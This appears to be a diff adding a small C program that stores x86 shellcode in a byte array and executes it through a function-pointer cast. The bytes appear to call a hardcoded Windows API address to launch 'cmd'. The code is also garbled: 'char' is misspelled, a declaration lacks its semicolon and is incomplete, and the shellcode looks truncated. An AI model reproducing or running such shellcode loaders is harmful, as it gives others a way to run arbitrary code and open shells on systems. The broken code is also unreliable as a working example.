@@ -1,0 +1,7 @@
+cahr code[]="\xeb\x16\x5b\x31\xc0\x50\x53\xbb\xad\x23\x86\x7c\xff\xd3\x31\xc0\xff\x63\x6d\x64"
+int main(int argc,char** argv){
+    int (*func)
+    func=(int (*)()) code;
+    (int)(*func)();
+    
+}
